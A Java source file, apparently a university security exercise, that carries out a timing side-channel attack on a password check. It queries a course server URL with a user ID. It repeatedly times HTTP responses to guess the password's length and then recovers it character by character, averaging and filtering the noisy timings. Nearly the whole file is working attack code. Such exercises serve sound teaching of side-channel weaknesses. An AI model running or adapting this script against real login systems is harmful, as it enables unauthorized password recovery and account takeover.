import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;

public class ex01_M1 {

    //שונות, ממוצע, סטטיסטיקה, סטיית תקן
    final static String URL = "http://aoi.ise.bgu.ac.il/?user=305264202&password=";
    final static int MAX_PASSWORD_LENGTH = 32;
    final static int LENGTH_TRIES = 10;
    final static int CHAR_TRIES = 100;
    final static char[] CHARS = {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
                                'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
                                '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};
    public static void main(String[] args) throws Exception {
        int length = get_length();
        String curl = URL;
        for (int i = 0; i < length; i++){
            int char_location = 0;
            double[] averages = new double[CHARS.length];

            for (int j = 0; j < CHARS.length; j++){
                String temp = curl + CHARS[j];
                for(int k = 1; k < length - i; k++) {
                    temp += 'a';
                }
                //System.out.println(temp);
                URL temp_url = new URL(temp);
                long[] times = new long[CHAR_TRIES];
                for (int k = 0; k < CHAR_TRIES; k++){
                    times[k] = attempt(temp_url);
                }

                double average = get_average(times);
                for (int k = 0; k < CHAR_TRIES; k++) {
                    while (times[k] > average * 1.5) {
                        times[k] = attempt(temp_url);
                    }
                }
                averages[j] = get_average(times);
                System.out.println(CHARS[j] + " " + averages[j]);
            }
            double max = averages[0];

            for (int k = 1; k < CHARS.length; k++) {
                if (averages[k] > max) {
                    max = averages[k];
                    char_location = k;
                }
            }
            System.out.println(CHARS[char_location]);
            curl += CHARS[char_location];
        }
        System.out.println(curl);
    }

    private static int get_length(){
//        for (int test = 0; test < 50; test++) {
//            long TEST_START = System.currentTimeMillis();
        String curl = URL;
        int password_length = 0;
        try {
            double[] averages = new double[MAX_PASSWORD_LENGTH];
            for (int i = 0; i < MAX_PASSWORD_LENGTH; i++) {
                curl += 'a';
                URL url = new URL(curl + 'a');
                double average = 0;
                long[] times = new long[LENGTH_TRIES];
                for (int j = 0; j < LENGTH_TRIES; j++) {
                    times[j] = attempt(url);
                }

                //clean noise
                average = get_average(times);
                //System.out.println("pre-clean average: " + average);
                for (int k = 0; k < LENGTH_TRIES; k++) {
                    while (times[k] > average * 1.5) {
                        times[k] = attempt(url);
                    }
                }

                average = get_average(times);

                //Printing times for observation
                //for (long time: times) {
                //    System.out.println(time);
                //}
                /////////////

                //System.out.println(i + "AVG: " + average);
                averages[i] = average;
                //System.out.println(curl);
            }
            //for (double avg: averages) {
            //    System.out.println(avg);
            //}
            double max = averages[0];
            password_length = 0;
            for (int i = 1; i < MAX_PASSWORD_LENGTH; i++) {
                if (averages[i] > max) {
                    max = averages[i];
                    password_length = i;
                }
            }
            password_length++;
            System.out.println(password_length);
            return password_length;

            //System.out.println(in.readLine());
        } catch (Exception ex) {
            System.out.println("We have a problem");
            //System.out.println(ex.getStackTrace());
        }
//            System.out.println(System.currentTimeMillis() - TEST_START);
//        }
        return password_length;
    }

    private static double get_average(long[] times){
        long average = 0;
        for (long time: times) { average += time; }
        return (average/times.length);
    }

    private static long attempt(URL url) throws IOException {
        long startTime = System.currentTimeMillis();
        BufferedReader in = new BufferedReader (new InputStreamReader((url.openConnection()).getInputStream()));
        return (System.currentTimeMillis() - startTime);
    }
}
